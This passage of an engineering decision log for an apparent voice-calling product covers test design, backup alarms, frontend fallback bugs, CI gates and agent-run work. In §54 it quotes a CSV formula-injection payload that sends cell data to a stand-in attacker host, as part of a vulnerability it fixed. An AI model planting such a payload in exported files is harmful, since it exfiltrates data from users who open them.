directions, deliberately.** The ops queue fails **VISIBLE** — a rule this build cannot name
keeps its row and says so, because an operator who cannot see a held account is back to
waiting for the email. The client's campaign-review screen fails **CLOSED** — an
unrecognised state stays held, because the alternative is a screen telling a client they
are clear to dial when the gate will refuse them. Both are correct and neither is derivable
from the other; they are the reason the frontend needed tests rather than more reading.

**`calls.latency` was dropped because every span we open measures our own post-call path,
not the caller's experience.** The column had been migrated and never written, while TRD §4
said every call logs stage timings — the rule standing without the mechanism. The case for
FILLING it was real and was answered rather than skipped: a column is queryable beside its
call, survives sampling (the trace ratio is 0.1, so nine calls in ten have no span at all)
and outlives trace retention. What killed it is that the in-call audio path runs inside the
rented engine, in a process we do not run, so the only timings we could have written are
the post-call pipeline's — and filling a column named `latency` from those would have
recorded the engine's two-to-three-minute wait for `completed` as a caller-perceived
number. That is worse than either honest option, because the next reader builds a dashboard
on it. Confirmed at the adapter rather than assumed: the snapshot carries nothing finer
than a duration, and the transcript arrives as prefix-tagged plain text, so every ingested
turn has NULL start/end. The slice also **overturned the adapter's own standing claim**
that per-turn timings are not exposed — the vendor does document a per-component latency
object — and still declined to store it, for three independently sufficient reasons: it is
a different set of numbers, nothing validates the arithmetic that would turn it into
voice-to-voice latency, and its documented per-turn entries carry recognised TEXT, which a
naive mapper lands in a column with no redacted counterpart. So it becomes a capture at
pilot gate 4, beside the stopwatch that can falsify it, and the storage shape gets chosen
from a payload we have actually received. D-52.

**The backup alarm's hook stopped being opt-in, and the dead man turned out to be the
harder half.** §49 shipped the backup chain with the honest note that the one alarm saying
the database is unrecoverable was the one alarm that reached nobody: it ran on the host as
`postgres`, outside every Python process, so it could not call the `alert()` that had just
been given a transport. The fix is a PROCESS boundary crossed by subprocess rather than a
second vocabulary — the same `failure_stage` and the same stable codes, relayed into
`alert()` — and the hook now DEFAULTS to that relay, so a host that configures nothing
still pages. An override stays exactly one command, because two delivery paths are two
dedupe windows and the day one of them stops, nobody notices. The rejected alternatives are
on the record: SMTP from the shell would put credentials and a second recipient inside a
shell script on the database host, and a long-lived local receiver would be a third thing to
supervise — worse, anything the app drains is a component the alarm would then depend on,
which is the failure the whole slice exists to avoid. Two consequences had to be designed
rather than inherited. Each relay is a FRESH PROCESS, so `alert()`'s in-memory suppression
suppresses nothing here, and a broken chain checked every fifteen minutes is ~96 mails a
day — which becomes a filter rule, which is an alarm reaching nobody again; the window is
therefore a stamp file per fingerprint with the interval IMPORTED from `alerting` rather
than copied, a failed delivery opens no window, and an unwritable state directory fails
OPEN. And the schedule now watches itself: a timer missing, inactive, or armed and silent
past its window is the failure `OnFailure=` structurally cannot see, because nothing ran so
nothing failed. Three residuals are named and left uncovered on purpose — host off,
systemd down, alert path broken beyond us — each of which removes the observer along with
the observed, so only something outside the failure domain can turn SILENCE into a page.
That is one line of configuration and it stays unbuilt because it adds a vendor.

**The frontend suite found two live bugs on its first run, because `in` walks the prototype
chain.** Every frontend guarantee had rested on `tsc`, ESLint, a green build and human
reading, while the frontend had accumulated exactly the decisions a type checker
structurally cannot see: the fail-CLOSED/fail-VISIBLE pair above, verdicts that key on the
server's computed answer and never on a raw status (so a lapsed consent cannot render
green), money that is a string and must never be parsed, and a null worst-case cost that
renders "we cannot say" and never ₹0. On the first run, `holdRule()` and five sites in the
KYC module tested membership with `in` — which walks the prototype chain — so a lookup of
`"constructor"` returned `Object` itself, typed as a hold rule, and the very next line
called a function that does not exist on it: **a TypeError that blanks the entire ops
queue.** A screen that goes white is the one way to fail that an operator cannot see past,
and the documented contract on that very function was fail-VISIBLE. The KYC twin answered
true the same way and rendered a verdict box with no headline and an undefined tone. Both
fixed with `Object.hasOwn`, one way per problem rather than two, and the suite was verified
to BITE — restoring the old expression turns the file red — rather than trusted because it
was green. The same shape survived in six more lookups fed by our own enums; that is lower
risk and was recorded for a sweep rather than swept in the same commit, which is the honest
version of "we found one class of bug" — and that sweep was in flight, uncommitted, as this
entry was written (see the note in the next-session list). Hard rule 9 was the gate on the
toolchain, not a footnote: 50 new packages read, the workspace allow-list byte-for-byte
unchanged, no build script blocked, and `pnpm audit` compared against a RESTORED baseline
lockfile rather than eyeballed. One
`debug`-adjacent transitive of exactly the shape the July 2025 campaign exploited was
chased to a fork published via npm OIDC trusted publishing — which is the specific failure
mode that incident turned on. D-53.

**Written up in §49 as they landed, and not repeated here** — because one account of a
decision is worth more than two: the eleven-index prefix sweep (four dropped, seven kept,
each keeper pinned by the plan that collapsed without it — and the finding that what
separates a droppable prefix from a load-bearing one is **btree deduplication**, not
uniqueness, which was the hypothesis the earlier migration deferred twelve tables on); the
alert delivery path itself; the WAL archiving tree; and the first-campaign hold's backend.
§50's contribution to those last two is the relay above and the screens above.

**What was refused, and what this entry corrected.** Refused: widening any RLS policy for a
work list; a materialized hold queue before the list is long enough to need one; putting a
reviewer's free text on the queue row; storing the vendor's latency object before we have
received one; a second backup delivery path beside the relay; and three conventional test
packages whose only job was sugar, each declined in the config with its reason. Corrected
in the documents, because this wave falsified them: §49's claim that the backup alarm does
not page and its note that `calls-stopped.md` lacked the first-campaign hold; OPERATIONS
§7's "ten conditions"; SURFACES §2c, which promises to list every shipped screen and did
not carry the two this wave added; ENGINEERING-PRACTICES' count of the wiring guard's
questions (three, when the fourth — the baseline checked against itself — is the one that
makes it a deferral list rather than an exemption file) and its silence on the frontend
gate; DEV-SETUP's command list, short by one guardrail and still saying `make check` runs a
web TYPECHECK; and a runbook line still telling operators that every plan reader takes the
newest row, which D-46 replaced in §48.

**What this wave adds to the method.** §48 asked which reader gives a declaration effect;
§49 asked who outside the repo would notice if a promise were false. This one asks the
same question of a control's OPERATOR: for every gate that refuses somebody, **who is told,
on which screen, and how do they clear it** — and for every rule the UI enforces, what
would fail if it were wrong. Both mitigations in the hold queue were correct, tested and
enforced, and both were unusable for the same reason; the frontend's contracts were
correct, documented and unchecked, and two of them were already broken.

## §51 — the wave that asked whether the assurances were assuring anything

1566 backend tests and 89 frontend ones, nine checks in the guardrail target, 93 OpenAPI
paths, one migration head. Seven slices landed, and they were commissioned separately but
turned out to be one question: **for every guarantee this repo believes it has, what
exactly would fail if it were false?** In six of the seven the honest answer was "nothing
we run" — not because the guarantee was wrong, but because the thing checking it could not
have noticed.

**A dedupe test that delivers the same webhook twice, in sequence, cannot fail the way
production fails.** It never puts two copies inside the INSERT at the same instant, which
is the only moment the claim can be wrong. `tests/webhook_storm_test.py` puts M copies
through a barrier and a task group so they contend for real, and the durable claim came
through clean: the INSERT *is* the claim, the unique index is the arbiter, losers block on
the winner's uncommitted index tuple, and `duplicate_count` lands on exactly M-1 out to 768
concurrent. The finding that mattered was about the harness, not the receiver. **ARQ's
job-id dedupe masks a broken durable claim**: with the inbox claim neutered every copy
still enqueues the same key and the queue collapses them, so a storm test asserting "one
job ran" stays green on a rotted receiver. The load-bearing assertions had to be on our own
rows. The file also carries a permanent negative control that runs the assertion helper
against a sequentially-correct, concurrently-wrong claim under `pytest.raises`, so a
harness that quietly stops contending fails instead of passing.

That suite then produced the wave's one capacity finding, and D-55 is what came of
**refusing to fix it before measuring it**. Ack p50 went 110ms at 1 concurrent to 1389ms at
384 with a FLAT distribution — p50 ≈ max, a convoy rather than a tail. Four plausible
causes were eliminated by measurement rather than argument: pool checkout waited 0.1ms at
192 concurrent and pools of 8, 16 and 32 measured identically; the enqueue inside the
transaction cost 26ms; the distinct-key storm, which contends for nothing, was as slow as
the same-key herd; and no profile hotspot existed to remove, our own code being 2.8% of it.
What remained was a saturated single core holding ~250 acks/s at every width, with latency
tracking in-flight ÷ throughput to within a few percent — Little's Law, which is *why* the
distribution is flat. So most of it is a sizing rule (2 processes at 100 concurrent, 4 at
250+, written into DEPLOYMENT §2a with the arithmetic, because a sizing rule nobody can
point at is not a rule). The one real defect was inside SQLAlchemy's default: connections
above `pool_size` are single-use, so the receiver burned 186 fresh Postgres backends for
1448 requests while never exceeding 15 concurrent, paying a SCRAM handshake — ~20% of the
core — to re-authenticate connections it had just discarded. **The enforcement that came
back is a connection COUNT, not a millisecond bound**, and that choice is the reusable
part: a wall-clock assertion under concurrency measures the CI runner, and a flaky latency
test gets deleted along with the guarantee it was carrying.

**`compliance_audit_test` required the NAME of the gate, and the gate returns a decision
rather than raising.** So a handler that calls `check_dispatch` and then ignores what comes
back type-checks, reviews clean, passes that test, and rings the phone. Deleting the `if
not decision.allowed` branch in `call_lead` was verified to leave the suite at 9 passed.
`scripts/check_compliance_invariants.py` walks the enclosing-function chain and requires
the decision to be branched on with the right polarity BEFORE the dial, with the refusal
branch terminating — while still admitting `assert_dispatch_allowed`, which satisfies the
rule without an `if`, because a check that demanded one would push callers back to the
weaker form. Its fourth section catches the bypass shape nothing looked for — an
environment read inside the gate — scoped to gate-bearing functions rather than to
compliance packages, because the audit chain legitimately salts with `app_env` and a
package-scoped check would have opened with a false positive and an exemption list. Its
fifth reads `pg_catalog` rather than trusting a migration, matching on constraint
DEFINITIONS and never names, since renaming is a legal migration: a name-keyed check fires
on the rename and stays green on the drop.

**The frontend's contracts were documented and unchecked, and the wire-lookup doctrine
turned out to need two mechanisms, not one.** The `in` half is a lint rule keyed on the
LEFT operand, which is what makes it free of false positives: a dynamic key is unsafe
against any object whoever built it, while literal-`in` is TypeScript's narrowing idiom and
stays legal. The bare-index half could not be a lint rule without noise — telling
`HOLD_RULES[rule]` from `KYC_STATUS_COPY[status]` needs types, and the untyped selector
fires on 35 sites the sweep deliberately left alone, which is the rule that gets disabled.
So it is a test that builds the real `tsc` program and asks the checker. **Its first draft
passed with a live bug**, because the unsafe table was a local alias and scope-only
analysis waved it through; following one alias hop caught it, and the limit is now written
in the file rather than assumed away. Four screens gained behavioural tests, ranked by the
consequence of a silently-wrong render rather than by branch count — the launch panel
first, because it is the only client screen that AUTHORISES rather than informs, and a
dropped blocker makes the compliance gate look like a malfunction, which is how bypasses
come to be requested.

**Google Sheets has no idempotency key, and the discovery document is what proved it.**
`developers.google.com` is egress-blocked from the build host but `sheets.googleapis.com`
is not, so the adapter was written against the live discovery doc rather than recall: no
`requestId`, no conditional write on the values resource, `RAW` over `USER_ENTERED`
(which makes every cell a candidate expression) and `INSERT_ROWS` over the OVERWRITE
default (which would silently clobber a client's totals block below their leads). The
residual — a crash between Google accepting and our commit — is only observable from the
second attempt, so a retry reads the delivery-id column before writing, and **a probe that
fails blocks the append entirely**: a late lead is recoverable, a duplicate row in a
document a human reads is not. Writing the hard-rule-6 test for it surfaced a pre-existing
leak nothing could have caught by inspection of our own code — httpx logs the full URL at
INFO, which is the spreadsheet id, and on the webhook path the client's endpoint, which for
Zapier and Make routinely carries the token in the query string. `redact_mapping` cannot
see it because it arrives as prose in the message.

**The backup alarm lived inside the failure domain it was watching.** Failure alarmed into
journald and a local hook, which answers every question except the one that matters: if the
box is dead the backup did not run AND nobody is told. The dead man inverts it — success
pings, a failing run pings nothing, a dead box cannot ping — and the discipline is that
there is deliberately no failure signal, with a test asserting no such literal exists
anywhere on the path. Hosted over self-hosted for the reason that decides this class of
question: self-hosting the observer puts it back inside the failure domain.

**And the guardrail set was itself the last thing nothing was checking.** `check_wiring`
had been in the guardrail target and in ZERO CI steps — the local gate ran it, the gate
that blocks merge did not — and the audit test stayed green because it was a hand-kept
list. It now globs `scripts/check_*.py` and requires each in both files. That was found by
`check:docs-drift`, whose own subject is the same class of claim: commands the docs name,
`D-xx` references, and the rule strings SEC-COMP §3 cites, the last of which only works
because it excludes docstrings — without that exclusion the check is satisfied by prose
about itself and survives a rename. It found `AGENTS.md` telling agents to run a harness
module that has not existed since it shipped, and six places naming package scripts against
the root manifest, which declares none.

**What this wave adds to the method.** §50 asked who OPERATES a control. This one asks what
would FAIL if a guarantee were false — and the answer kept coming back "the test that
covers it, in a way the defect cannot reach": sequential where production is concurrent,
name-matching where the bug is a missing branch, type-checked where the bug type-checks,
local where the failure is the host dying. The move that worked, seven times, was to ask
what the checker is physically able to observe, and then either change the mechanism or
write down that it cannot.

## §52 — the design pass, and the screens that were confidently wrong

The founder pushed a UI: an app shell with a collapsible grouped sidebar, a 72px sticky
header, 14px cards on a recessed page, brand-green medallions, lucide icons, and PP Mori
as a local font. "That is the style we are going to follow from now on." Twenty-three
slices later every screen in both realms speaks it, the frontend suite went from 40 tests
to 364, and the wave's finding is not about design at all.

**Almost every screen answered a failed request with a confident emptiness.** Not a crash,
not a blank — a sentence. The dashboard fell back to `?? 5430`, so a client whose calls had
STOPPED would have been shown 5,430 calls and a healthy trend. The leads board painted six
"No leads" columns over a 503. The analytics screens ended `if (!data) return null` and
rendered nothing at all, so a dead endpoint and a quiet week were indistinguishable. The
attention queue drew an empty card UNDER its own alert, which reads as "nothing needs you".
Knowledge said "Nothing submitted yet" over an unread list. The DNC list said "nobody is
suppressed yet" over a list that never loaded. The admin console said "0 accounts" while
loading. And the ops screen — the one somebody opens BECAUSE calls have stopped — defaulted
`halted` to `false` and reported "Outbound calling: running" with a green pip, from a value
nobody sent.

One defect, nine costumes. The rule that replaced it is now written on every screen:
**loading is a skeleton, failure is a refusal, and neither is a number, a state, or an empty
state.** The corollary took longer to see and is the more useful half — a fallback is not a
kindness. `?? 0` is correct on the campaign progress tiles, where `contacts` is a complete
GROUP BY and an absent key genuinely IS zero, and a lie on the leads board, where the same
two characters invent a count from a capped page. The question is never "is a default
tidier", it is "does the server's silence mean this value".

**The design's own numbers were mock, and saying so was the work.** The dashboard shipped
with 3,482 successful calls, a $0.042 cost per call, 286 booked appointments, a 13.6%
conversion rate, a seven-day chart of invented bars, an activity feed of American phone
numbers printed in full, and "+18.4% vs Apr 28 – May 4" under every figure. Everything the
API could answer was wired; everything it could not is ABSENT rather than approximated, and
`StatTile` has no `delta` prop at all — with a comment saying why, because a trend arrow is
the most trusted pixel on a dashboard and a hardcoded one is worse than none. The chart
became real when `/v1/dashboard` grew `daily_7d`: seven IST calendar days, zero-filled, with
four class counts that PARTITION `calls.status` so the stack always fills its column and an
owner can add the segments up. It deliberately does not sum to `calls_7d` — calendar days
against a rolling 168 hours — and the field says so, because a chart forced to agree with a
headline number would have to lie about one of them.

**Six numbers on the leads screen were lying, and the API had already fixed one of them.**
The stage tally was `items.filter(...)` over a 100-row cap under a server-side status
filter, so a client who clicked "hot" was told `new 0 · contacted 0 · interested 0 · won 0 ·
lost 0`. `LeadListOut.status_counts_matching_search` exists for exactly this and names it in
its own comment as the bug it replaces; nothing read it. The same shape turned up again in
the attention queue, where each of four sources capped at 25 and the badge counted the page
— and fixing it there surfaced two more: a per-source cap under a merged limit made "the N
most recent" false, and `stalled_campaigns` filtered healthy campaigns in PYTHON after
`LIMIT`, so busy campaigns burned page slots on their way to being discarded.

**Money grew a distinction worth keeping.** Totals go through `formatINR`, which formats the
DIGITS of the API's string and never parses them — `Number("10159.00")` is how ₹10,159.00
becomes ₹10,158.999999999998 on a screen a client checks against their books. But a RATE must
not: `overage_rate_inr` is NUMERIC(12,4) published unrounded so `qty × unit = amount` holds,
and `formatINR` would print ₹7.1250 as ₹7.12 — breaking the invoice's arithmetic IN OUR
FAVOUR. Two formatters, one page, and the reason in both.

**Permission gates were right and their explanations were in the wrong place.** The leads
Export button rendered for everyone though the route requires `calls:read_raw`, which
`staff` does not hold — a deliberate restriction wearing the costume of a broken button. The
campaigns panel gated correctly but put the reason a screenful above the dead control, under
a sentence truthfully reading "Everything checks out." `/usage` was not gated at all, so a
staff member collected a red 403 that reads like an outage. And the call detail screen told
owners to "ask your account manager for the full transcript" while an audited, self-service
endpoint sat there that the owner already had permission to use.

**The two guardrail gaps this wave opened, it also closed.** Clerk sign-in landed with eight
`NEXT_PUBLIC_*` keys documented as COMMENTS in `.env.example`, because a real `KEY=` line
would have made the Python parity check demand a matching `Settings` field — a rule
honourable only by writing it where no machine reads it. `check_web_env_parity` closes that,
and matters because `next build` INLINES these: a misspelled key is not an error, it is the
empty string in the bundle. And the coverage ratchet, which had failed CI twice for slack,
learned to REFUSE TO SCORE a run it cannot vouch for — because both "fixes" had been to copy
CI's number into the baseline, which is how a ratchet dies.

That second one corrected the log. §51's account of the ratchet failures blamed a local
database holding 31,527 test organizations. Measured, that was wrong: a freshly seeded
database still gave the local numbers. The real causes were REDIS state — `_current_head`
queries Postgres only on a cache MISS, and 72,000 leftover keys deleted that fallback from
the measurement — and MACHINE SPEED, since `webhook_ack_slow` fires only past hard rule 3's
500ms budget: never on an idle laptop, sometimes on a contended runner. The first is now
refused; the second is undetectable in-process and says so in three places.

**What this wave adds to the method.** §51 asked what would fail if a guarantee were false.
This one asks the question a screen cannot ask itself: **when the server does not answer,
what does this pixel claim?** Every defect above is the same answer given twice — the value
the server sent, and the value the screen invents when it sent nothing — rendered
identically. The move that worked twenty-three times was to read every `??`, every `|| []`,
every `if (!data) return null` and ask whether the fallback is a fact about the world or a
fact about our ignorance.

A note on method for the next session, learned the hard way: **three of this wave's
sabotages were worthless and passed.** Pointing a scan at `organizations` broke it outright
(RLS returns zero rows, so nothing ran); dropping `DISTINCT` changed nothing because each
tenant had one route; patching a value that sits BELOW an earlier error guard never
executed. A green suite under a sabotage is not evidence — it is a broken experiment, and
the first thing to check is whether the sabotage reached the code at all.

## §53 — the gate that had been red for nine commits, and nobody had looked

This wave opened by spawning four agents on four slices. Before any of them reported, a
check of the branch's CI turned up the thing that mattered most: **CI had been failing on
every commit for the last three and a half hours — nine consecutive runs — and the previous
session closed believing its work had landed.** Pushing is not landing. The log now says so
in the one place a session actually looks.

**One gate, one branch, both directions.** Every one of the nine failed on
`coverage:ratchet`. Measured properly — a `git archive` of HEAD into a clean directory so
the agents' in-flight edits could not contaminate it, a database templated fresh from a
migrated+seeded one, a flushed Redis, the whole suite under coverage:

    voice-runtime-ack: 24 uncovered unit(s), budget 22 (+2)
      webhook_routes.py: 182, 180->182

Those two units are the entire failure. `webhook_ack_slow` fires only when an ack breaches
hard rule 3's 500ms budget — on a request that normally costs single-digit milliseconds —
so whether that branch executes is a property of the HARDWARE. And because the ratchet is
an EQUALITY (under budget fails too, so an improvement gets locked in rather than banked
silently), it failed both ways: `7f3c18e0` ran on a contended runner, measured 22 against a
budget of 24, and failed as an improvement nobody had locked in; `93df3d9` wrote 22 into the
baseline; every runner since was fast enough to measure 24 and fail as a regression nobody
had introduced. Same root, alternating sign, eight more red runs.

The baseline file's own first line says never to hand-edit a number to quieten this gate.
Both previous responses were exactly that edit. That is less carelessness than it looks:
the gate's docstring had DOCUMENTED this branch as an unfixable divergence and declared
"CI's number is the authority for `voice-runtime-ack`", which is an instruction to do the
thing that broke it. It also named the real fix and left it unwritten — *"a test that drives
the slow path deterministically would cover it in both places"*.

So the fix is that test, and the shape of it is the point. It moves the THRESHOLD, not the
clock: patching `_ack_ms` to return a fake number would assert that `alert()` is reachable
while measuring nothing, whereas lowering `_ACK_BUDGET_MS` runs the real timing path and
puts the real elapsed value through the real comparison and into the real alert detail. It
is also the file's own established way to drive a threshold (`_DURABLE_DEADLINE_S` is
patched exactly so), which makes it one way rather than a second. Its pair asserts the other
direction at the real 500ms budget, because a receiver that alerted on EVERY delivery would
satisfy the first test alone and be as useless as one that never alerted. Both also pin the
contract the branch carries: **a breach is a signal, not a refusal** — the engine delivers
at-most-once and never retries (D-31), so answering a slow ack with an error would turn "we
were late" into "the call is lost". 24 before, 22 after, every surface at its floor.

And then the doctrine came out: the docstring's carve-out, the baseline's `_doc`, and the
failure epilogue that told readers to suspect a slow machine before suspecting their code.
All three now say there is no known speed-dependent branch and no CI-is-the-authority
exemption, and that a future one gets a test rather than an edited number.

**The generalisation worth keeping.** §51 asked what would fail if a guarantee were false.
§52 asked what a pixel claims when the server does not answer. This one asks it of our own
instruments: **when a gate is red for a long time, the gate's explanation of itself is a
suspect, not a source.** Three sessions read this failure through a sentence the gate wrote
about its own blind spot, and each diagnosis was wrong in the direction that sentence
pointed. The tell was available the whole time and nobody computed it: a number that moves
in BOTH directions across a series of commits is not measuring the commits.

**The second finding was a process one and it is mine.** While independently re-running an
agent's sabotage — the right instinct; an agent's report is a claim, not evidence — I
restored the file afterwards with `git checkout-index -f`, which restores from the INDEX.
The index still held HEAD's version, so instead of undoing my one-line sabotage it reverted
that agent's entire slice in the file. This is the second time in two waves that a
restore-from-index command has eaten live work, and both times it was a command this repo's
own agent briefs forbid. The rule that actually holds: **while anything else is editing the
tree, the only safe undo is a file copy you made yourself before the experiment.** `cp
file backup` then `cp backup file` worked correctly on `webhook_routes.py` twenty minutes
earlier in the same session, which is the whole argument.

**The five slices.** Four agents in parallel, one whole slice each end to end, plus a
fifth spawned mid-wave from the first one's own finding.

*Lead ownership (M3).* `leads.assigned_to` had existed since the first migration, with a
foreign key and an ON DELETE SET NULL, and nothing in the repo read or wrote it — an
explicit `UNWIRED_BASELINE` entry whose text said it closes with the assignment action.
`lead_events` was the mirror image: six producers write it and no client could read a
word, so "we called them twice, WhatsApp was refused, the campaign gave up" was a fact we
recorded and never showed to the person it was about. Two things in it generalise. The
tenancy check goes through `memberships`, not the FK, because `users` is global and
un-RLS'd — a foreign user id satisfies a foreign key perfectly, so the FK is not a tenancy
control and never was. And the timeline PROJECTS its payload rather than serialising it:
the column is schemaless JSONB from six independent producers, and "none of them stores a
phone number today" is not a property you can rely on, so the read whitelists keys with
the producer-by-producer audit written above the function. It also turned up a live 500 —
`PATCH /v1/leads/{id}` with a status could not be planned at all (`jsonb_build_object` is
`VARIADIC "any"`, psycopg3 sends a bare `str` as `unknown`), surviving because no test
had ever sent a body.

*The dispatch tick (D-57).* 22.9s on a 30-second schedule, 25.3s once the database
carried a million call rows. The measurement chose the design and contradicted the
obvious fix: 48% of it was session SETUP, 30% the query, 21% the commit, 1% the tenant
list — two thirds session machinery, and 80% of that CPU inside the worker, so
bounded-parallel sessions measured 22.9s → 17.2s at 8-way and were not shipped. The
screening loop moved into Postgres WITHOUT moving out of RLS: a SECURITY INVOKER function
that sets `app.tenant_id` per tenant and reads under that tenant's own policies, returning
only tenants that hold a line or run a campaign. 25.29s / 12,071 sessions → 0.32s / 2.
Overlap was a real bug and not the one it sounds like — an arq cron id embeds its intended
execution time, so consecutive ticks are different jobs and do overlap, but the claim CAS
already prevented a double DIAL; what two ticks could both do is spend the whole shared
line pool, a read-then-act on the resource that keeps other clients' receptionists
answering.

*The ops surface (D-58).* The most destructive control in the product was the only
mutation on its router with no step-up, and the console collected a typed confirmation
word it never sent — a dialog that confirmed nothing to the server. Then the follow-up
slice asked the better question: a confirmation you cannot SIZE is a habit, not a control.
Depth, per-job breakdown and oldest age now render above the click, from the same
aggregate that feeds the metric, and the replay can be scoped by job — which the 100-row
cap makes necessary rather than nice, since recovering one client's CRM webhooks out of a
backlog of dead-lettered emails otherwise moves 100 emails and reports success. Separately,
the client directory had rolled its own `capped` read with no month predicate, so it could
show a red badge for a tenant the dial gate happily dials.

*The wizard's middle step.* An API shipped in §45 with FLOWS §1's eight fields, and
nothing in either realm called it. Number provisioning and the test-call gate stay absent
because they are pilot-gated; the intake step was absent for no reason at all.

**Three of the five agents caught their own broken experiment**, which is the method
working rather than luck: a permission sabotage that passed because a blocker guard
already disabled the control; a narrowing sabotage that passed because a Python `continue`
still stood behind it; a button sabotage that passed because with depth 0 no scope select
rendered, so the guard under test was doing no work. Each was traced, the fixture or the
code fixed, and the sabotage then failed as it should. One lease sabotage HUNG rather than
failing, which is worse than passing — a test whose failure mode is a hang teaches people
to kill the run — and is now bounded by a timeout.

**Two defects only the FULL suite could find**, both invisible to every agent's targeted
run: `tm_registration_test` pins the exact key set of `GET /v1/ops/platform` and another
slice added a field to it (the exact-set assertion is right and did its job); and my own
new ack-budget test compared the alert's `f"{elapsed:.0f}"` against the header's
`f"{elapsed:.1f}"`, double-rounding, so at 9.4555 it wanted "10ms" and got "9ms". It
passed until a measurement landed on a .x5 boundary — a test that fails one run in ten is
worse than no test, and it was written in the same wave as the entry above complaining
about exactly that. The gate then caught a real +4 on `dial-path`: two new observability
paths (the tick-overrun alert, the lease-release failure) whose only test was "hope it
fires in production". They have tests now, and `dial-path` holds 123 while growing from
500 statements to 547.

## §54 — five slices that could proceed, and the export nobody had armed

Five agents, one whole slice each. Chosen on one criterion: **nothing here is blocked on
the Bolna pilot or on a founder decision.** That criterion is worth keeping, because the
audit that opened this wave found the roadmap's real position — the code is complete
through M1 and M2 and into M3, and **Gate G0 has never been attempted**: the pilot
scorecard in `docs/evidence/` is an unfilled template, not one field, neither verdict box
ticked. So the build is far ahead of the sequence on the code axis and at zero on the
vendor axis, and the useful work is whatever does not need a vendor.

**The wave's most serious finding was a vulnerability, and the obvious fix for it was
wrong.** `crm/service.py::_csv_value` wrote caller-supplied extraction values into
`/leads/export.csv` with no formula guard, while `integrations/service.py::_disarm`
guarded the byte-identical value on the Sheets path. A caller chooses their own name;
that name becomes a cell, and `=IMPORTXML("https://attacker.example"&A1,"//x")` executes
when the client opens their own leads in Excel. Verified before fixing, not assumed.

The obvious remedy — reuse `_disarm` — would have been a defect. The leading apostrophe
is *Google Sheets'* "this is text" marker, which Sheets consumes; a CSV has no such
convention, so Excel shows the quote and every ordinary value beginning `-` grows a stray
character in the client's own data. OWASP's Excel remedy is a TAB (0x09) **inside the
quoted field**, which in turn forced `csv.writer` to `QUOTE_ALL` — unquoted, the tab is
not reliably part of the value and the mitigation stops mitigating. So "one way per
problem" here meant sharing the DANGER and not the remedy: one `FORMULA_LEADERS` list
(including the full-width forms that are leaders in some locales), two renderings, each
naming its consumer. **The rule that generalises: when two call sites look identical,
check whether their CONSUMERS are, before making them share code.**

**The test that found it was also wrong, and that is the more interesting half.** Its
assertion forbade a leading tab alongside the formula leaders — so OWASP's remedy read as
a violation of itself. `\t` and `\r` belong in the leader set because a value ARRIVING
with one is suspicious; neither executes. Conflating *what we refuse to accept* with
*what we refuse to emit* is the confusion, and it is easy to write.

**The strict-xfail pattern earned its keep.** The red-team slice could not edit `apps/`,
so it recorded the finding as `xfail(strict=True)` asserting the DESIRED behaviour. The
fix lifted the marker without changing a line of the assertion. An xfail asserting today's
bug would have had to be rewritten by whoever fixed it, and would have read as if the bug
were the specification.

**Three slices refused rather than half-wiring, and each refusal is more useful than the
feature would have been.** A/B testing covers outbound and REFUSES an inbound-only
experiment, because inbound call rows are created where no experiment is consulted and a
screen reading "not enough data" forever is worse than a missing button. The intake draft
drew its line between structural validation (still enforced) and completeness blockers
(the whole point of a draft) — and the reason is not tidiness: the read parses the stored
sheet back through the same model, so an unvalidated sheet returns `None` and the next
resume renders a blank form OVER stored answers, with the operator's retyping as the
payload. And the QA report refuses to print a percentage under twelve scenarios.

**The statistics were searched, not recalled, and the number is load-bearing.**
`MIN_CALLS_PER_VARIANT = 40` comes from Fagerland/Lydersen/Laake's coverage result for
Newcombe's hybrid interval, not from taste; Wilson replaces Wald because Brown/Cai/
DasGupta measured Wald's coverage "oscillating wildly" at exactly our sample sizes. Below
the minimum, no comparison is published at all — not a wide one, not a hedged one — and
the leader is labelled "ahead so far" with no badge. A wrong significance claim on a
sales-facing number is worse than no number.

**A guardrail was crashing rather than judging.** `check_wiring.unmounted_routers` read
`.endpoint` off every entry of `router.routes`, and a nested `include_router` leaves a
marker there that has none — so the guard raised AttributeError. That is the worst failure
mode for executable governance: it reads as a broken tool rather than a finding, and the
reflex is to route around the guard. A slice hit it, worked around it correctly, and
reported it; the crash was still ours.

**Four of five agents caught their own broken experiment this wave** — a UI sabotage the
server already made unobservable, a cross-tenant sabotage RLS made unreachable, a language
default that only ever appeared on the wire, a defect count compared against another zero.
Each was traced and the test strengthened. **And I ran a worthless one myself**: stripping
`FOR UPDATE` from what turned out to be a docstring, which passed and briefly looked like
an agent had overclaimed. Against the real statement the test failed as reported. The
method is only as good as the care taken with the sabotage itself.

**What this wave adds to the method.** §53 asked what a pixel claims when the server does
not answer. This one asks: **when two paths carry the same value, is the difference between
them a detail or the whole point?** The CSV and the Sheet, the accept-check and the
emit-check, the derived bucket and the stored one, the draft and the submission — every
defect above is two things that looked alike being treated as one, or two things that
looked different being treated as separate.

## §55 — the wave that asked whether the guards were guarding anything

§54 asked whether two paths carrying one value were really the same. This one asks the
question a level down: **the guard exists, the docstring describes it — does it fire?**
Six of the ten defects fixed here were guards that ran and did nothing, and in five of
them a comment or docstring asserted precisely the property that was false. That is now
this repo's confirmed signature failure mode, and it is why the audit that opened this
wave trusted only executable evidence.

**The chain lock was never consulted.** `write_audit` took `redis.set(nx=True)` into a
variable read only by the `finally` that decided whether to release it — a writer that
LOST the race proceeded anyway. Two writers read head H0, both wrote `prev_hash = H0`,
and `verify_chain` reported the second as tampered: a tamper-evidence feature
manufacturing its own tamper evidence, under a docstring reading "behind a short lock so
concurrent writers cannot interleave". Nothing in the suite exercised contention, which
is exactly why it survived — every existing audit assertion writes one entry at a time,
and one writer never races anybody.

**Repairing the ignoring would not have been enough, and that is the more useful
lesson.** The entry commits in the CALLER's transaction, so correctness requires that no
second writer read the head between our read and our COMMIT — a window of unbounded
length. No TTL lease covers it: a 4s commit outlives a 3s lease. The Redis-cached head
had the same defect one level down, and worse, because its failure is DURABLE: published
inside the transaction, a ROLLBACK erased the row and left the cache naming it, so the
next writer chained onto a hash no row carried, in a ledger that is append-only and
cannot be repaired. **When a critical section IS a database transaction, the lock should
be the transaction** — `pg_advisory_xact_lock`, released by COMMIT or ROLLBACK, the two
events that decide whether the row exists. `credit_ledger` already worked this way; D-59
records the reasoning and BACKEND-PATTERNS §5/§7 are amended in place rather than
carrying an exception.

**The verification answered a smaller question in the same words.** `limit=1000` over
`ORDER BY at ASC` checked the OLDEST thousand — on any real log, the entries nobody was
worried about — and the console rendered the result as an unqualified green tick. The
walk is unbounded now and reports `entries_checked` / `complete` / the `at` range beside
the verdict.

**And it no longer stops at the first break, which was the hardest call in the wave.**
